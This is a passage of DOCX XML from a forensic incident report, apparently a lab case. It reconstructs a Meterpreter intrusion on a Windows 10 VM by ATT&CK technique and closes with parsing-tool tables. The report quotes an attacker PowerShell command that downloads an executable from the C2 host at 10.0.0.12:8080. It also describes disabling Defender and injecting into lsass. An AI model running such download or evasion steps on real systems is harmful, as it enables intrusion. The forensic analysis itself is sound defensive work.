            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2023-11-10 10:16:38.642518 → 2023-11-10 11:36:48.063750</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-015</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Plaintext credential file C:\Users\medmondson\Desktop\not_my_pass.txt created during the live Meterpreter session (credential exposure)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:05.178200 → 2023-11-10 11:13:57</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Technical assessment</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Host:** DESKTOP-KJ81A5A, Windows 10 Pro 1903 (build 18362), VMware VM, IP 10.0.0.124. Installed 2023-11-09. Sysmon 15.1 has been logging since 2023-11-10 10:51:10 UTC.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Delivery (T1189/T1204.002, T1105)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Edge (browser_broker.exe) fetched http://10.0.0.12:8080/pscp.exe at 10:16:43, 10:17:53 and 10:19:36. Each time Defender raised 1116/1117 Trojan:Win64/Meterpreter.E and quarantined the file.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The copy downloaded at 10:19:53 survived. It was copied at 10:20:10 to C:\Payloads\pscp.exe (MFT 85781, Zone.Identifier ZoneId=3 HostUrl http://10.0.0.12:8080/pscp.exe).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The Downloads original went to the Recycle Bin as $RHOVDEL.exe.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- At 10:21:41 PowerShell wget downloaded a further copy, C:\Payloads\test.exe (986,624 B).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Defense evasion (T1562.001)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Defender 5007/5001 events record: Tamper Protection toggled, Exclusions\Paths\C:\Payloads\ (10:19:24), SpyNet/SubmitSamples off, and real-time protection disabled at 10:19:46 and 11:02:11.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The 11:02:11 disable went through the Windows Security UI (consent.exe → SecurityHealthHost → MsMpEng, Sysmon 13).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The collection-time registry still shows DisableRealtimeMonitoring=1 and the exclusion.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Execution (T1036.005)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Sysmon 1 at 11:03:09.902: C:\Payloads\pscp.exe, PID 2196, GUID {e6e9f951-0ded-654e-8f01-000000000500}.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Parent: powershell 1088 {…0de1-654e-8801…}, elevated token LogonId 0x15347, High integrity level.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Hashes: MD5 DED9E58DD95A88A4BEE89B74A65F05F1, SHA256 ABBF7B5F7A059348A17DCD8BCD464767125F54B4F8691F0F810AC1819C6CF931, IMPHASH ADD361A4F3939AF38D11873F1D74BDED.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Version info: OriginalFileName PSCP, PuTTY suite, Release 0.79.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Corroborated by Prefetch PSCP.EXE-1DCA12FC.pf (RunCount 1, 11:03:09.900), SRUM, ShimCache, PSReadLine and 4104 entries showing `.\pscp.exe`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Process injection / migration (T1055)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 11:03:09.989: pscp.exe spawned explorer.exe PID 7324 {…0ded-654e-9001…}.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Sysmon 8 CreateRemoteThread into it (StartAddress 0xB30000).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 11:03:56: explorer 7324 → lsass.exe CreateRemoteThread (T1003.001, probable).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Discovery (T1016, T1033, T1057, T1049, T1087.001)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- cmd 6600 {…0e2d-654e-9101…}: tracert ×3 (including 8.8.8.8) and quser.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- cmd 5848 {…0f52-654e-ad01…}: powershell 736 {…0f56-654e-af01…}, tasklist, netstat -ntb, whoami /user, net user administrator → net1. Net1 produced Security 4798 on RID 500.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Every command has a matching Prefetch entry.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**PowerShell (T1059.001)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- PowerShell 600 at 11:06:40: HostName=MSFConsole, HostApplication=explorer.exe, HostId 26d014a9-f96a-4767-98ca-5ee12cac58b9. These are Meterpreter powershell extension and Invoke-DcSync bootstrap script blocks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Command and control / ingress transfer (T1071.001, T1105)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Powershell 736 connected from 10.0.0.124:50009 to 10.0.0.12:8080 (Sysmon 3, 11:10:56) and ran `wget http://10.0.0.12:8080/1.exe -o 1.exe`, creating C:\Users\medmondson\1.exe (986,624 B).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- test.exe and 1.exe show no execution artefacts.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- SRUM: explorer.exe sent 69 KB in the interval ending 11:43.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The last activity of explorer 7324 was a CLR UsageLog write at 11:16:03.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Credential exposure**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Desktop\not_my_pass.txt (cleartext 'password123!@#') was saved at 11:13:56 by the user's own Notepad, not by the attacker chain.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Negative results (sources available and reviewed)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No persistence: services, tasks, Run keys, WMI, COM, Startup.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No account changes and no remote logons, RDP, PsExec or WinRM.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No archiving or exfiltration beyond the C2.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No log clearing or timestomping.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Scope, sources and methodology</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 Analyzed system</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Observed host names</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DESKTOP-KJ81A5A (154888), WIN-ELL0II3NDSJ (1607), strawberryperl.com (8), widget.mibbit.com (4), perldoc.perl.org (4), search.cpan.org (4), learn.perl.org (4), www.metacpan.org (3), go.microsoft.com (3)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Observed accounts</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>medmondson (436282), S-1-5-18 (10762), S-1-5-21-1841083384-974204330-411256071-1001 (4666), DESKTOP-KJ81A5A\medmondson (3753), S-1-5-19 (2332), NT AUTHORITY\SYSTEM (1494), systemprofile (880), Default (850), S-1-5-21-1841083384-974204330-411256071-1000 (548), Public (285), NT AUTHORITY\SYSTEM (S-1-5-18) (280), WORKGROUP\DESKTOP-KJ81A5A$ (228), LocalService (227), DESKTOP-KJ81A5A\medmondson (S-1-5-21-1841083384-974204330-411256071-1001) (181), NetworkService (146)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Machine time zone</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>ActiveTimeBias = 480 min (UTC = local time + bias)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Time convention of the report</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>All times are UTC.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Available traces</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>1,007,010 timeline events, from 1983-08-07 09:00:00 to 2026-10-19 15:05:18</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 Collection and processing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>KAPE collection (!SANS_Triage target); parsing by recognized tools orchestrated by orchestrator.py; normalization into DuckDB by normalize.py; analysis by analyze.py following the playbook. The raw tool outputs are kept in C:\Sleuthline\cases\test01\parsed and every cited piece of evidence points to them.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1701"/>
        <w:gridCol w:w="2835"/>
        <w:gridCol w:w="1020"/>
        <w:gridCol w:w="3118"/>
        <w:gridCol w:w="850"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Job</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Artifact / tool</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Status</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Tool and version</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Duration</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>amcacheparser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AmcacheParser - Amcache.hve</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AmcacheParser latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>appcompatcache</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AppCompatCacheParser - ShimCache</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AppCompatCacheParser latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Chainsaw - Sigma detections + Chainsaw rules</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>chainsaw v2.17.1; chainsaw_mapping v2.17.1; sigma_rules_dir r2026-07-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>11 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect - Windows plugins (no secrets)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E36C09"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>partial</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect dissect.target 3.25.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>166 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EvtxECmd - EVTX (maps)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EvtxECmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>14 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Hayabusa - detections (all rules)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>hayabusa v4.2.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>10 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>jlecmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>JLECmd - Jump Lists</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ok</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>JLECmd latest (2026-10-19, net9); MFTECmd 2026.5.0.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="850"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1 s</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
